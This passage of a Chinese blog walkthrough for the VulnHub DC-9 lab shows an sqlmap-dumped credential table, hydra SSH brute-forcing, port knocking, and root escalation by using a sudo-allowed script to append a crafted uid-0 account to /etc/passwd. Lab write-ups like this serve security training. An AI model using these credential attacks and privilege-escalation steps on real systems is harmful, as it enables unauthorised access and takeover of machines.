|</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string">| marym     | 3kfs86sfd     |</span></span><br><span class="line"><span class="string">| julied    | 468sfdfsd2    |</span></span><br><span class="line"><span class="string">| fredf     | 4sfd87sfd1    |</span></span><br><span class="line"><span class="string">| barneyr   | RocksOff      |</span></span><br><span class="line"><span class="string">| tomc      | TC&amp;TheBoyz    |</span></span><br><span class="line"><span class="string">| jerrym    | B8m#48sd      |</span></span><br><span class="line"><span class="string">| wilmaf    | Pebbles       |</span></span><br><span class="line"><span class="string">| bettyr    | BamBam01      |</span></span><br><span class="line"><span class="string">| chandlerb | UrAG0D!       |</span></span><br><span class="line"><span class="string">| joeyt     | Passw0rd      |</span></span><br><span class="line"><span class="string">| rachelg   | yN72#dsd      |</span></span><br><span class="line"><span class="string">| rossg     | ILoveRachel   |</span></span><br><span class="line"><span class="string">| monicag   | 3248dsds7s    |</span></span><br><span class="line"><span class="string">| phoebeb   | smellycats    |</span></span><br><span class="line"><span class="string">| scoots    | YR3BVxxxw87   |</span></span><br><span class="line"><span class="string">| janitor   | Ilovepeepee   |</span></span><br><span class="line"><span class="string">| janitor2  | Hawaii-Five-0 |</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:12:26] [INFO] table &#x27;users.UserDetails&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.8/dump/users/UserDetails.csv&#x27;</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:12:26 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h2 id="0x05-爆破"><a href="#0x05-爆破" class="headerlink" title="0x05.爆破"></a>0x05.爆破</h2><h3 id="1-破解admin密码为transorbital1"><a href="#1-破解admin密码为transorbital1" class="headerlink" title="1.破解admin密码为transorbital1"></a>1.破解admin密码为<code>transorbital1</code></h3><img src="/2020/09/02/DC-9/image-20200902151603443.png"><h2 id="0x06-登入web-application"><a href="#0x06-登入web-application" class="headerlink" title="0x06.登入web application"></a>0x06.登入web application</h2><p><code>发现文件不存在，推测存在包含</code></p><img src="/2020/09/02/DC-9/image-20200902154421208.png"><p><code>测试，爆破包含参数略</code></p><img src="/2020/09/02/DC-9/image-20200902154513168.png"><p><code>可以看到数据库跑出来的用户可以进行登入</code></p><p><code>但是有knockd存在过滤，所以查看knockd配置文件，可以看到三个用户可以登入</code></p><img src="/2020/09/02/DC-9/image-20200902154938542.png"><p><code>nmap测试</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.1.8; done</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00066s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">7469/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.20 seconds</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">8475/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.19 seconds</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">9842/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.18 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x07-爆破ssh"><a href="#0x07-爆破ssh" class="headerlink" title="0x07.爆破ssh"></a>0x07.爆破ssh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># hydra -L user.txt -P pass.txt 192.168.1.8 ssh</span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-02 03:58:38</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.8:22/</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: janitor   password: Ilovepeepee</span><br><span class="line">1 of 1 target successfully completed, 3 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-02 03:59:26</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ssh登入，只在janitor用户下发现有用的文件，一些密码。并且sudo -l无果</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">janitor@dc-9:~$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------  4 janitor janitor 4096 Sep  2 17:57 .</span><br><span class="line">drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 janitor janitor 4096 Sep  2 17:57 .gnupg</span><br><span class="line">drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin</span><br><span class="line">janitor@dc-9:~$</span><br><span class="line">janitor@dc-9:~$ <span class="built_in">cd</span> .secrets-for-putin/</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ ls</span><br><span class="line">passwords-found-on-post-it-notes.txt</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$</span><br></pre></td></tr></table></figure><h2 id="0x08-再次爆破ssh"><a href="#0x08-再次爆破ssh" class="headerlink" title="0x08.再次爆破ssh"></a>0x08.再次爆破ssh</h2><p><code>重新编辑密码字典</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># cat pass.txt </span></span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m<span class="comment">#48sd</span></span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72<span class="comment">#dsd</span></span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br><span class="line">root@JIYE:~/vulnhub/dc9</span><br></pre></td></tr></table></figure><p><code>再次爆破，又发现一个用户</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># hydra -L user.txt -P pass.txt 192.168.1.8 ssh</span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-02 04:13:22</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 391 login tries (l:17/p:23), ~25 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.8:22/</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: fredf   password: B4-Tru3-001</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: janitor   password: Ilovepeepee</span><br><span class="line">[STATUS] 368.00 tries/min, 368 tries <span class="keyword">in</span> 00:01h, 25 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 16 active</span><br><span class="line">1 of 1 target successfully completed, 4 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-02 04:14:40</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x09-fredf登入"><a href="#0x09-fredf登入" class="headerlink" title="0x09.fredf登入"></a>0x09.fredf登入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> fredf on dc-9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User fredf may run the following commands on dc-9:</span><br><span class="line">    (root) NOPASSWD: /opt/devstuff/dist/<span class="built_in">test</span>/<span class="built_in">test</span></span><br><span class="line">fredf@dc-9:~$</span><br></pre></td></tr></table></figure><h2 id="0x10-提权"><a href="#0x10-提权" class="headerlink" title="0x10.提权"></a>0x10.提权</h2><p><code>查看test</code></p><blockquote><p>此代码含义：</p><p>一共两个”参数（文件）”，打开第一个文件，读取里面文件赋值给output；打开第二个文件，写入output，关闭。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff$ cat test.py </span><br><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != 3 :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[1], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[2], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line">fredf@dc-9:/opt/devstuff$</span><br></pre></td></tr></table></figure><p><code>既然这样就可以向/etc/passwd写入文件</code></p><p><code>由于/etc/passwd的第二个字段受到密码保护，所以先生成口令</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># openssl passwd -1 -salt demo 123</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$demo</span><span class="variable">$N8rNOM51XVLc6Sj7cqsmT</span>/</span><br><span class="line">root@JIYE:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编辑</span><br><span class="line">fredf@dc-9:~$ <span class="built_in">echo</span> <span class="string">&#x27;demo:$1$demo$N8rNOM51XVLc6Sj7cqsmT/:0:0::/root:/bin/bash&#x27;</span> &gt; /tmp/demo</span><br></pre></td></tr></table></figure><p><code>执行</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/<span class="built_in">test</span>$ sudo ./<span class="built_in">test</span> /tmp/demo /etc/passwd</span><br><span class="line">fredf@dc-9:/opt/devstuff/dist/<span class="built_in">test</span>$ su demo</span><br><span class="line">Password: </span><br><span class="line">root@dc-9:/opt/devstuff/dist/<span class="built_in">test</span><span class="comment"># cd</span></span><br><span class="line">root@dc-9:~<span class="comment"># ls</span></span><br><span class="line">theflag.txt</span><br><span class="line">root@dc-9:~<span class="comment"># cat theflag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have <span class="keyword">done</span> well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge <span class="keyword">in</span> the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks <span class="keyword">for</span> all the fish.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@dc-9:~<span class="comment"># </span></span><br></pre></td></tr></table></figure></div><div><div><div style="text-align:center;color:#000;font-size:20px">-------------纸短情长<i class="fa fa-paw"></i>下次再见-------------</div></div></div><div class="reward-container"><div>加个赞赏，万一有好心人呢~</div><button onclick='document.querySelector(".post-reward").classList.toggle("active")'>谢谢你请我吃辣条!</button><div class="post-reward"><div><img src="/images/wechatpay.jpg" alt="Lluna 微信"> <span>微信</span></div><div><img src="/images/alipay.jpg" alt="Lluna 支付宝"> <span>支付宝</span></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Lluna</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://lunamoore.github.io/2020/09/02/DC-9/" title="DC-9">https://lunamoore.github.io/2020/09/02/DC-9/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请标注链接及作者！</li></ul></div><div class="followme"><span>欢迎关注我的公众号</span><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/images/gzh.jpg"><span class="icon"><i class="fab fa-weixin"></i> </span><span class="label">WeChat</span></a></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶机</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/09/01/HTB-buff/" rel="prev" title="HTB-[buff]"><i class="fa fa-chevron-left"></i> HTB-[buff]</a></div><div class="post-nav-item"><a href="/2020/09/05/HTB-admirer/" rel="next" title="HTB-[admirer]">HTB-[admirer] <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2020 – <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Lluna</span></div><div class="wordcount"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-chart-line"></i> </span><span>站点总字数：</span> <span title="站点总字数">558k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span>站点阅读时长 &asymp;</span> <span title="站点阅读时长">8:27</span></span></div><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,8,14,15,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="小站已运行"+T+" 天 "+f+" 小时 "+h+" 分钟 "+u+" 秒"}siteTime()</script><div class="busuanzi-count"><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div><script color="0,0,0" opacity="0.7" zindex="-1" count="300" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: location.pathname,
    }, {"enable":true,"appId":"8hPlmJu758GqGb8p9gI7IWIH-gzGzoHsz","appKey":"EBvPjdspqOEm800591erwHwx","placeholder":"ヾﾉ≧∀≦)o来了老弟!","avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});</script><script type="text/javascript" src="/js/love.js"></script></body></html>